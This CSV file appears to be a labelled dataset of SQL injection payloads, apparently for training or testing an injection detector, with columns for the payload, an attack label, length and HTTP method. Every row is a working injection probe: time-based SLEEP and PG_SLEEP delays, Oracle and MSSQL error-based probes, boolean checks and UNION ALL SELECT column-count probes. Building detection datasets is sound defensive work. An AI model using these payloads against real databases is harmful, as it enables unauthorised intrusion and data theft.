sentence,attack_type,len_payload,http_method
'  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'AeRN' LIKE 'AeRN,1,301,POST
'  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'KGZB' = 'KGZB,1,298,POST
'  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 'AeRN' LIKE 'AeRN,1,301,POST
  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 90 = 90,1,288,POST
  )  )   )  AND 9217 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 58 ) ||CHR ( 99 ) ||CHR ( 108 ) ||CHR ( 122 ) ||CHR ( 58 ) || ( SELECT  ( CASE WHEN  ( 9217 = 9217 )  THEN 1 ELSE 0 END )  FROM DUAL ) ||CHR ( 58 ) ||CHR ( 120 ) ||CHR ( 105 ) ||CHR ( 100 ) ||CHR ( 58  )  )   AND   (  (   ( 90 = 90,1,288,POST
  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 745 = 745,1,86,POST
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'NMeg' LIKE 'NMeg,1,97,POST
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'VkOS,1,85,POST
'  )  )   )  AND 9263 =  ( SELECT 9263 FROM PG_SLEEP ( 5  )  )   AND   (  (   ( 'VkOS' = 'VkOS,1,94,POST
  )  )   )  AND 93 = 93 AND   (  (   ( 2816 = 2816,1,48,POST
'  )  )   )  AND 93 = 93 AND   (  (   ( 'oMMM' = 'oMMM,1,54,POST
'  )  )   )  AND 93 = 93 AND   (  (   ( 'UFCU' LIKE 'UFCU,1,57,POST
  )  )   )  AND 9346 = 2080-- AND   (  (   ( 7093 = 7093,1,54,POST
'  )  )   )  AND 9373 = 4888# AND   (  (   ( 'FDxz' = 'FDxz,1,59,POST
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'mBsh' = 'mBsh",1,299,POST
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'hZcS' LIKE 'hZcS",1,302,POST
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'mBsh' = 'mBsh",1,299,POST
"'  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 'hZcS' LIKE 'hZcS",1,302,POST
"  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 9401 = 9401",1,293,POST
"  )  )   )  AND 942 = CONVERT ( INT, ( CHAR ( 58 ) +CHAR ( 99 ) +CHAR ( 108 ) +CHAR ( 122 ) +CHAR ( 58 ) + ( SELECT  ( CASE WHEN  ( 942 = 942 )  THEN CHAR ( 49 )  ELSE CHAR ( 48 )  END  )  )  +CHAR ( 58 ) +CHAR ( 120 ) +CHAR ( 105 ) +CHAR ( 100 ) +CHAR ( 58  )  )   )  AND   (  (   ( 9401 = 9401",1,293,POST
'  )  )   )  AND 9421 = 9484 AND   (  (   ( 'ZaIT' = 'ZaIT,1,58,POST
  )  )   )  AND 9563 = 2025 AND   (  (   ( 4031 = 4031,1,52,POST
  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 2542 = 2542,1,56,POST
'  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 'atDr' = 'atDr,1,62,POST
'  )  )   )  AND SLEEP ( 5 ) --  AND   (  (   ( 'suST' LIKE 'suST,1,65,POST
  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 848 = 848,1,51,POST
'  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 'gpfJ' = 'gpfJ,1,59,POST
'  )  )   )  AND SLEEP ( 5 )  AND   (  (   ( 'wvIN' LIKE 'wvIN,1,62,POST
  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 5602 = 5602,1,60,POST
  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 6917 = 6917,1,60,POST
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'ABHW' = 'ABHW,1,66,POST
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'iKCR' LIKE 'iKCR,1,69,POST
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'qmQq' = 'qmQq,1,66,POST
'  )  )   )  UNION ALL SELECT NULL-- AND   (  (   ( 'uhFb' LIKE 'uhFb,1,69,POST
  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 6496 = 6496,1,59,POST
  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 7727 = 7727,1,59,POST
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'mvvE' LIKE 'mvvE,1,68,POST
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'okQW' LIKE 'okQW,1,68,POST
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'rxUo' = 'rxUo,1,65,POST
'  )  )   )  UNION ALL SELECT NULL# AND   (  (   ( 'YbIT' = 'YbIT,1,65,POST
"  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 1698 = 1698",1,66,POST
"  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 2149 = 2149",1,66,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'RHnQ' LIKE 'RHnQ",1,75,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'wGuu' = 'wGuu",1,72,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'WpyD' LIKE 'WpyD",1,75,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL-- AND   (  (   ( 'yJUV' = 'yJUV",1,72,POST
"  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 6490 = 6490",1,65,POST
"  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 9524 = 9524",1,65,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'cKqd' LIKE 'cKqd",1,74,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'crTV' LIKE 'crTV",1,74,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'jTOk' = 'jTOk",1,71,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL# AND   (  (   ( 'nZwi' = 'nZwi",1,71,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 5044 = 5044",1,72,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 7672 = 7672",1,72,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'jarF' LIKE 'jarF",1,81,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'lMmh' = 'lMmh",1,78,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'nAut' LIKE 'nAut",1,81,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL-- AND   (  (   ( 'uMVf' = 'uMVf",1,78,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 5144 = 5144",1,71,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 9606 = 9606",1,71,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'Jrrv' LIKE 'Jrrv",1,80,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'qIam' = 'qIam",1,77,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'TguG' = 'TguG",1,77,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL# AND   (  (   ( 'Utjd' LIKE 'Utjd",1,80,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 1322 = 1322",1,78,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 5424 = 5424",1,78,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'LoPY' LIKE 'LoPY",1,87,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'TjRv' = 'TjRv",1,84,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'vmoF' = 'vmoF",1,84,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL-- AND   (  (   ( 'YDjm' LIKE 'YDjm",1,87,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2621 = ",1,72,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2621 = 2621",1,77,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2686 = ",1,72,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 2686 = 2686",1,77,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'DfQT' = 'DfQT",1,83,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'GURC' LIKE 'GURC",1,86,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'NQFt' = 'NQFt",1,83,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL# AND   (  (   ( 'oKll' LIKE 'oKll",1,86,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5794 = 5794",1,84,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6801 = 6801",1,84,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'dKLo' LIKE 'dKLo",1,93,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'KUsu' = 'KUsu",1,90,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'lFxr' LIKE 'lFxr",1,93,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'pRqL' = 'pRqL",1,90,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (  ",1,67,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 3429 = 3429",1,83,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7386 = 7386",1,83,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'lZQa' = 'lZQa",1,89,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'QqSw' = 'QqSw",1,89,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'rvZu' LIKE 'rvZu",1,92,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'YUuH' LIKE 'YUuH",1,92,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 1758 = 1758",1,90,GET
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6957 = 6957",1,90,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'Kgqz' = 'Kgqz",1,96,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'MElC' = 'MElC",1,96,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'sYJP' LIKE 'sYJP",1,99,GET
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'VvGL' LIKE 'VvGL",1,99,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#",1,65,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# ",1,62,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2060 = 2060",1,89,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 3181 = 3181",1,89,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Aomr' LIKE 'Aomr",1,98,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Dgvq' = 'Dgvq",1,95,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'QRyq' LIKE 'QRyq",1,98,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'UPKL' = 'UPKL",1,95,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 6693 = 6693",1,96,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 917 = 917",1,94,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'nsCb' = 'nsCb",1,102,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'uaeU' LIKE 'uaeU",1,105,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'yKIx' = 'yKIx",1,102,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'znUJ' LIKE 'znUJ",1,105,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 1078 = 1078",1,95,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7701 = 7701",1,95,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'CznY' LIKE 'CznY",1,104,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'oBeE' = 'oBeE",1,101,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'SVHv' = 'SVHv",1,101,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'YVDB' LIKE 'YVDB",1,104,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 1371 = 1371",1,102,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 403 = 403",1,100,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'jMeV' LIKE 'jMeV",1,111,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'KoQn' LIKE 'KoQn",1,111,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'nFdK' = 'nFdK",1,108,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'zEzg' = 'zEzg",1,108,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5403 = 5403",1,101,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7790 = 7790",1,101,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'bKUm' = 'bKUm",1,107,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'hHNs' LIKE 'hHNs",1,110,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'pPHu' LIKE 'pPHu",1,110,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'qcju' = 'qcju",1,107,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 8557 = 8557",1,108,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 9181 = 9181",1,108,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'PyWA' = 'PyWA",1,114,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'YCGp' LIKE 'YCGp",1,117,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'YpBC' = 'YpBC",1,114,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'ZlUG' LIKE 'ZlUG",1,117,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2906 = 2906",1,107,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 5473 = 5473",1,107,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'eBka' = 'eBka",1,113,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Fbdy' = 'Fbdy",1,113,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'isvX' LIKE 'isvX",1,116,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'rWOf' LIKE 'rWOf",1,116,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5338 = 5338",1,114,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 7442 = 7442",1,114,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'DPSa' LIKE 'DPSa",1,123,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'pzvT' = 'pzvT",1,120,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'qPKT' LIKE 'qPKT",1,123,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'wrni' = 'wrni",1,120,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 2062 = 2062",1,113,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 7050 = 7050",1,113,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'fpyt' LIKE 'fpyt",1,122,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'IOYc' = 'IOYc",1,119,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'iQuJ' LIKE 'iQuJ",1,122,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'NsaY' = 'NsaY",1,119,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 270 = 270",1,118,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 7174 = 7174",1,120,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'esYe' LIKE 'esYe",1,129,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'eYIP' = 'eYIP",1,126,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'tPDj' = 'tPDj",1,126,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'vHKJ' LIKE 'vHKJ",1,129,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 4184 = 4184",1,119,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'CzUq' = 'CzUq",1,125,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'Hugb' LIKE 'Hugb",1,128,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'PRaw' = 'PRaw",1,125,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL# AND   (  (   ( 'scYM' LIKE 'scYM",1,128,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 4913 = 4913",1,126,POST
"  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 5689 = 5689",1,126,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'FwYl' LIKE 'FwYl",1,135,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'QCFA' = 'QCFA",1,132,POST
"'  )  )   )  UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL-- AND   (  (   ( 'rMAu' = 'rMAu",1,132,POST
